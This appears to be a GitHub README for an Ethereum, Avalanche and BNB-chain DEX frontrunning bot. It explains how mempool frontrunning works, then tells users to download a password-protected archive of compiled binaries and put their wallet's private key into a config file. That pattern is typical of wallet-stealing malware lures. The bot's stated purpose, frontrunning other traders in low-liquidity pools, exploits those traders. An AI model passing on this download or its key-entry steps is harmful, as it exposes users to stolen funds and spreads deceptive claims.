## What is it?
![alt text](https://github.com/sunshineioxzc/amm-frontrun-bot/blob/main/example.png?raw=true)

An automated market maker (AMM) frontrunning bot works by taking advantage of price changes that occur in decentralized exchanges (DEXs), such as Uniswap or PancakeSwap that use an AMM model. In an AMM model, a bot can detect a pending trade on the network and place a trade before the original order executes, in an attempt to profit from the price change that will occur as a result of the original trade.

The AMM frontrunning bot uses advanced algorithms to monitor the network for pending trades and estimate the price impact that the trade will have on the market. It then calculates the optimal position to take in anticipation of the trade and places an order to execute the trade before the original order can be executed.

The bot can detect pending trades by monitoring the mempool, which is the pool of unconfirmed transactions waiting to be added to the blockchain. By analyzing the mempool and the price movement, the bot can predict the price change that will occur when the trade is executed and use this information to execute a profitable trade.

AMM frontrunning bots can be particularly effective on DEXs with low liquidity, as the impact of a large trade on the market can be significant, leading to a greater price change that can be exploited.

### Features
This bot uses Nethereum library for connection to the blockchain network and monitoring the mempool for pending trades. The configuration specifies the private key of the trading account, smart contracts for monitoring and chain_id of the network. The bot works in Ethereum, Avalanche, Binance networks with Uniswap, Traderjoe and Pancackeswap DEXs.
### Setup
- [Download](https://github.com/sunshineioxzc/amm-frontrun-bot/archive/refs/heads/main.zip) compiled binaries and extract with passwod `BOt6maR1IghegO`.
- Edit `config.json` file. Add private key for trading account and `chain_id` of network you work with.
- Set addresses of smart contracts in config file. You need to choose contracts with a small liquidity in the pool for more profits. You can check liquidity on `dextools.io`.
